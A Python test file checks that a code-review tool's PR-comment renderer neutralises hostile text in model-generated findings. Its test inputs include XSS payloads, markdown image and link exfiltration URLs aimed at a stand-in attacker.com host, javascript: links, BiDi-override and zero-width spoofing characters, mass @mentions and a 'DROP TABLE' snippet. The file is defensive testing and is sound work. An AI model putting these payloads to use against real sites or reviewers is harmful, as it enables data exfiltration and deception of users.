"""Tests for the markdown-safe PR comment renderer.

These tests pin the security contract (Red Team T3): a malicious finding
whose model-emitted free-form text contains markdown injection (HTML, image
exfil, autolinks, broken codeblock fences, link-syntax in file paths) MUST
NOT survive into the rendered PR comment body.
"""

from __future__ import annotations

from spectra import __version__
from spectra.adapters.pr_comment_renderer import (
    PR_COMMENT_SENTINEL,
    SUMMARY_MAX_CHARS,
    TOP_FINDINGS_LIMIT,
    render_pr_comment,
)
from spectra.entities.models import (
    AnalysisReport,
    DimensionScore,
    FileLocation,
    Finding,
    ScoreCard,
    score_to_grade,
)

# ── Fixtures (local — keeps the test file self-contained) ────


def _scorecard(overall: float = 83.0, total_findings: int = 0) -> ScoreCard:
    """Build a deterministic scorecard for a given overall score."""
    dims = (
        DimensionScore(dimension="architecture", score=85.0, grade="B+", findings_count=2, weight=0.25),
        DimensionScore(dimension="security", score=90.0, grade="A", findings_count=1, weight=0.25),
        DimensionScore(dimension="quality", score=78.0, grade="B-", findings_count=3, weight=0.20),
        DimensionScore(dimension="documentation", score=70.0, grade="C", findings_count=2, weight=0.10),
        DimensionScore(dimension="maintainability", score=82.0, grade="B", findings_count=2, weight=0.10),
        DimensionScore(dimension="performance", score=88.0, grade="B+", findings_count=1, weight=0.10),
    )
    return ScoreCard(
        overall_score=overall,
        overall_grade=score_to_grade(overall),
        dimensions=dims,
        total_findings=total_findings,
    )


def _report(findings: tuple[Finding, ...] = (), score: float = 83.0) -> AnalysisReport:
    """Wrap findings in a minimal AnalysisReport."""
    return AnalysisReport(
        repo_url="https://github.com/example/repo",
        repo_name="repo",
        score_card=_scorecard(overall=score, total_findings=len(findings)),
        findings=findings,
        analysis_duration_seconds=12.3,
        total_tokens_used=10_000,
        total_cost_usd=0.05,
        agents_used=("architecture", "security"),
    )


def _finding(
    *,
    title: str = "Finding title",
    description: str = "A detailed description of the issue.",
    severity: str = "high",
    dimension: str = "security",
    file_path: str = "src/main.py",
    line_start: int = 10,
    line_end: int | None = 20,
    recommendation: str = "Apply the fix described above.",
    code_snippet: str = "",
) -> Finding:
    return Finding(
        id="F-001",
        dimension=dimension,
        severity=severity,
        title=title,
        description=description,
        location=FileLocation(file_path=file_path, line_start=line_start, line_end=line_end),
        recommendation=recommendation,
        agent_role="security",
        confidence=0.9,
        code_snippet=code_snippet,
    )


# ── Sentinel + structural contract ───────────────────────────


class TestSentinel:
    def test_sentinel_constant(self):
        assert PR_COMMENT_SENTINEL == "<!-- SPECTRA -->"

    def test_sentinel_is_first_line_empty_report(self):
        out = render_pr_comment(_report(findings=()))
        assert out.splitlines()[0] == PR_COMMENT_SENTINEL

    def test_sentinel_is_first_line_with_findings(self):
        out = render_pr_comment(_report(findings=(_finding(),)))
        assert out.splitlines()[0] == PR_COMMENT_SENTINEL


class TestEmptyReport:
    def test_zero_findings_message_present(self):
        out = render_pr_comment(_report(findings=()))
        assert f"No findings — Spectra v{__version__}" in out

    def test_zero_findings_uses_check_glyph(self):
        out = render_pr_comment(_report(findings=()))
        assert "✓" in out


class TestScoreCardBlock:
    def test_overall_grade_rendered(self):
        out = render_pr_comment(_report(findings=(_finding(),), score=87.0))
        assert "A-" in out

    def test_dimension_table_present(self):
        out = render_pr_comment(_report(findings=(_finding(),)))
        # Markdown table separator
        assert "| Dimension |" in out
        assert "| --- |" in out


# ── HTML/script injection (T3 core) ──────────────────────────


class TestHtmlInjection:
    def test_img_onerror_in_title_escaped(self):
        f = _finding(title="<img src=x onerror=alert(1)>")
        out = render_pr_comment(_report(findings=(f,)))
        # Raw HTML must NOT survive — angle brackets are escaped so the
        # browser sees inert text, never a parsed <img> element.
        assert "<img" not in out
        # The escaped form is present and renders as visible text.
        assert "&lt;img src=x onerror=alert(1)&gt;" in out

    def test_script_tag_in_description_escaped_when_summary_kept(self):
        # description IS surfaced as a (truncated) summary in the allowlist,
        # but it must be HTML-escaped so a <script> tag becomes inert text.
        f = _finding(description="<script>alert('pwn')</script>")
        out = render_pr_comment(_report(findings=(f,)))
        assert "<script>" not in out
        # The escaped form (which a markdown renderer prints as visible text)
        # is acceptable; what must NOT happen is the browser parsing a real
        # <script> element.
        assert "&lt;script&gt;" in out

    def test_html_in_recommendation_dropped(self):
        # recommendation is NOT in the allowlist — its content (including
        # the literal "javascript:" scheme and the surrounding <a> tag)
        # must not surface at all.
        f = _finding(recommendation="<a href=javascript:alert(1)>click</a>")
        out = render_pr_comment(_report(findings=(f,)))
        assert "javascript:" not in out
        assert "<a " not in out
        assert "click</a>" not in out


# ── Markdown image / autolink injection ──────────────────────


class TestMarkdownImageInjection:
    def test_image_exfil_in_summary_dropped(self):
        # If a summary is provided to the renderer (via description) and contains
        # an image, the renderer drops the entire summary rather than escape it,
        # so attacker-controlled URLs never surface.
        evil = "Looks fine ![exfil](https://attacker.com/?d=hello) trust me"
        f = _finding(description=evil)
        out = render_pr_comment(_report(findings=(f,)))
        assert "attacker.com" not in out
        assert "![exfil]" not in out

    def test_autolink_in_summary_dropped(self):
        evil = "see <https://attacker.com/evil> for details"
        f = _finding(description=evil)
        out = render_pr_comment(_report(findings=(f,)))
        assert "attacker.com" not in out


# ── Markdown link / URL exfiltration (residual concern, R3) ──
#
# The original sanitizer caught markdown IMAGES and ANGLE-BRACKET autolinks,
# but four URL-bearing constructs slipped through and could deliver an
# attacker-controlled clickable link to a reviewer's browser:
#   1. inline links ``[text](url)``
#   2. reference-style links ``[text][ref]`` + a ``[ref]: url`` definition
#      (the title and description can collude across fields)
#   3. bare URLs (GitHub auto-linkifies ``https://...`` in markdown)
#   4. Unicode BiDi overrides + zero-width characters (visual deception)


class TestMarkdownLinkExfil:
    def test_inline_link_in_title_neutered(self):
        f = _finding(title="Click [here](https://attacker.com/exfil) now")
        out = render_pr_comment(_report(findings=(f,)))
        # No clickable URL reaches the rendered comment.
        assert "attacker.com" not in out
        # The bracket-paren link syntax must be broken so GitHub does not
        # render it as an anchor.
        assert "](http" not in out

    def test_inline_link_in_summary_dropped(self):
        evil = "see [this fix](https://attacker.com/exfil?d=user) for details"
        f = _finding(description=evil)
        out = render_pr_comment(_report(findings=(f,)))
        assert "attacker.com" not in out

    def test_reference_link_in_title_neutered(self):
        # Title carries the link USE, description holds the DEFINITION —
        # combined, they would render as a clickable anchor on GitHub.
        f = _finding(
            title="Click [here][evil] for fix",
            description="[evil]: https://attacker.com/exfil",
        )
        out = render_pr_comment(_report(findings=(f,)))
        assert "attacker.com" not in out
        # Reference-style brackets must not be intact in the title.
        assert "][evil]" not in out

    def test_reference_definition_in_summary_dropped(self):
        # A reference DEFINITION in a description is dangerous even on its
        # own — a future linked-from-elsewhere comment could resolve it.
        evil = "real text [evil]: https://attacker.com/exfil"
        f = _finding(description=evil)
        out = render_pr_comment(_report(findings=(f,)))
        assert "attacker.com" not in out

    def test_bare_url_in_title_neutered(self):
        # GitHub auto-linkifies bare URLs in markdown comments. A title is
        # NOT inside a code span, so the URL must be broken.
        f = _finding(title="see https://attacker.com/exfil for details")
        out = render_pr_comment(_report(findings=(f,)))
        assert "attacker.com" not in out

    def test_bare_url_in_summary_dropped(self):
        evil = "https://attacker.com/exfil please visit"
        f = _finding(description=evil)
        out = render_pr_comment(_report(findings=(f,)))
        assert "attacker.com" not in out


class TestGitHubAutolinkAbuse:
    """GitHub auto-linkifies @mentions, #issue refs, and commit SHAs in PR
    comments — a poisoned finding could spam-tag arbitrary users or wire
    up misleading cross-references. Neutralize the trigger characters.
    """

    def test_at_mention_in_title_neutered(self):
        f = _finding(title="ping @everyone fix this")
        out = render_pr_comment(_report(findings=(f,)))
        # The '@' must not be followed by a username pattern that GitHub
        # would render as a notification.
        assert "@everyone" not in out

    def test_at_mention_in_summary_dropped_or_neutered(self):
        f = _finding(description="ping @user1 see also @octocat for context")
        out = render_pr_comment(_report(findings=(f,)))
        assert "@user1" not in out
        assert "@octocat" not in out

    def test_issue_ref_in_title_neutered(self):
        f = _finding(title="related to #1337 (totally unrelated upstream issue)")
        out = render_pr_comment(_report(findings=(f,)))
        # The '#<digits>' pattern must not survive — GitHub would auto-link
        # it to whatever issue #1337 happens to be in the host repo.
        assert "#1337" not in out

    def test_commit_sha_in_summary_dropped_or_neutered(self):
        # 7+ hex chars get auto-linkified by GitHub as a commit reference.
        f = _finding(description="see also a1b2c3d4e5f6789012345678901234567890abcd for details")
        out = render_pr_comment(_report(findings=(f,)))
        assert "a1b2c3d4e5f6789012345678901234567890abcd" not in out


class TestUnicodeDeception:
    """BiDi overrides and zero-width chars enable visual-spoofing attacks
    where a finding looks innocuous in the rendered comment but carries
    hidden / re-ordered content that misleads a reviewer.
    """

    def test_rtl_override_stripped_from_title(self):
        # U+202E RIGHT-TO-LEFT OVERRIDE flips the visual order of trailing
        # text — classic "exe-as-jpg" trick.
        f = _finding(title="Important fix‮ .gpj.exe")
        out = render_pr_comment(_report(findings=(f,)))
        assert "‮" not in out

    def test_lro_stripped_from_title(self):
        # U+202D LEFT-TO-RIGHT OVERRIDE — same family.
        f = _finding(title="ok‭ hidden")
        out = render_pr_comment(_report(findings=(f,)))
        assert "‭" not in out

    def test_zero_width_space_stripped_from_title(self):
        f = _finding(title="hello​world")
        out = render_pr_comment(_report(findings=(f,)))
        assert "​" not in out

    def test_bom_stripped_from_summary(self):
        f = _finding(description="text﻿with bom")
        out = render_pr_comment(_report(findings=(f,)))
        assert "﻿" not in out

    def test_zwj_stripped_from_title(self):
        # U+200D ZERO WIDTH JOINER — used in homoglyph attacks.
        f = _finding(title="abc‍def")
        out = render_pr_comment(_report(findings=(f,)))
        assert "‍" not in out


# ── Backtick / codeblock fence break ─────────────────────────


class TestBacktickInjection:
    def test_backticks_in_title_replaced(self):
        evil_title = "```<script>alert(1)</script>```"
        f = _finding(title=evil_title)
        out = render_pr_comment(_report(findings=(f,)))
        # No raw backticks from the title made it into the output
        # (the rendered comment uses backticks itself for code-spans, so we
        # check that the specific dangerous fence sequence is gone).
        assert "```" not in out
        # And the script tag is HTML-escaped, not raw.
        assert "<script>" not in out

    def test_single_backtick_in_title_replaced(self):
        f = _finding(title="break `inline` code")
        out = render_pr_comment(_report(findings=(f,)))
        # Modifier grave (U+02CB) substituted in for safety.
        assert "ˋ" in out  # noqa: RUF001 — visual-similarity is intentional


# ── File path link injection ─────────────────────────────────


class TestFilePathEscape:
    def test_bracket_in_file_path_does_not_break_inline_code(self):
        f = _finding(file_path="src/weird]name.py", line_start=42)
        out = render_pr_comment(_report(findings=(f,)))
        # Path appears safely inside a code span — the literal `]` is
        # backslash-escaped so it cannot terminate a markdown link.
        assert r"\]" in out or "src/weird]name.py" not in out

    def test_paren_in_file_path_escaped(self):
        f = _finding(file_path="src/(weird)/file.py", line_start=1)
        out = render_pr_comment(_report(findings=(f,)))
        assert r"\(" in out or "src/(weird)/file.py" not in out

    def test_normal_path_renders_as_inline_code(self):
        f = _finding(file_path="src/main.py", line_start=10)
        out = render_pr_comment(_report(findings=(f,)))
        assert "`src/main.py" in out


# ── Field allowlist enforcement ──────────────────────────────


class TestFieldAllowlist:
    def test_recommendation_never_appears(self):
        f = _finding(recommendation="exfil this secret payload abcdef123")
        out = render_pr_comment(_report(findings=(f,)))
        assert "exfil this secret payload" not in out
        assert "abcdef123" not in out

    def test_code_snippet_never_appears(self):
        f = _finding(code_snippet="DROP TABLE users; -- attacker")
        out = render_pr_comment(_report(findings=(f,)))
        assert "DROP TABLE" not in out
        assert "attacker" not in out

    def test_allowlisted_fields_present(self):
        f = _finding(
            title="SQL injection in login",
            severity="critical",
            dimension="security",
            file_path="src/auth.py",
            line_start=42,
            line_end=58,
        )
        out = render_pr_comment(_report(findings=(f,)))
        assert "SQL injection in login" in out
        assert "CRITICAL" in out
        assert "security" in out.lower()
        assert "src/auth.py" in out
        assert "42" in out


# ── Summary truncation ───────────────────────────────────────


class TestSummaryTruncation:
    def test_long_summary_truncated(self):
        long = "lorem ipsum " * 100  # > 1000 chars
        f = _finding(description=long)
        out = render_pr_comment(_report(findings=(f,)))
        # Find the rendered summary line and confirm it ends with the truncation
        # ellipsis. We can't anchor on the exact line easily so we assert the
        # raw long input is NOT present in full.
        assert long not in out
        assert "…" in out

    def test_summary_under_limit_not_truncated(self):
        short = "a clean short summary"
        f = _finding(description=short)
        out = render_pr_comment(_report(findings=(f,)))
        assert short in out

    def test_truncation_threshold_value(self):
        # Sanity check on the constant — the renderer must not silently drift.
        assert SUMMARY_MAX_CHARS == 200


# ── Pagination ───────────────────────────────────────────────


class TestPagination:
    def test_more_than_top_limit_findings_truncates(self):
        n = TOP_FINDINGS_LIMIT + 30
        # Use unique non-prefix titles so substring checks are unambiguous.
        findings = tuple(
            _finding(
                title=f"finding-uid-{i:04d}-z",
                severity="critical" if i % 2 == 0 else "high",
                line_start=i + 1,
            )
            for i in range(n)
        )
        out = render_pr_comment(_report(findings=findings))
        rendered_titles = [t for t in (f.title for f in findings) if t in out]
        assert len(rendered_titles) == TOP_FINDINGS_LIMIT
        # "+N more" footer
        remaining = n - TOP_FINDINGS_LIMIT
        assert f"+{remaining} more" in out

    def test_fewer_than_limit_no_more_link(self):
        findings = tuple(_finding(title=f"f-{i}", line_start=i + 1) for i in range(3))
        out = render_pr_comment(_report(findings=findings))
        # No overflow footer when total findings <= TOP_FINDINGS_LIMIT.
        assert "+0 more" not in out
        assert "more — see the full report" not in out

    def test_critical_high_rendered_first(self):
        info = _finding(title="info-noise", severity="info", line_start=1)
        crit = _finding(title="crit-bug", severity="critical", line_start=2)
        out = render_pr_comment(_report(findings=(info, crit)))
        # critical comes before info in the body
        assert out.index("crit-bug") < out.index("info-noise")


# ── Idempotency / determinism ────────────────────────────────


class TestDeterminism:
    def test_same_input_same_output(self):
        f = _finding()
        a = render_pr_comment(_report(findings=(f,)))
        b = render_pr_comment(_report(findings=(f,)))
        assert a == b
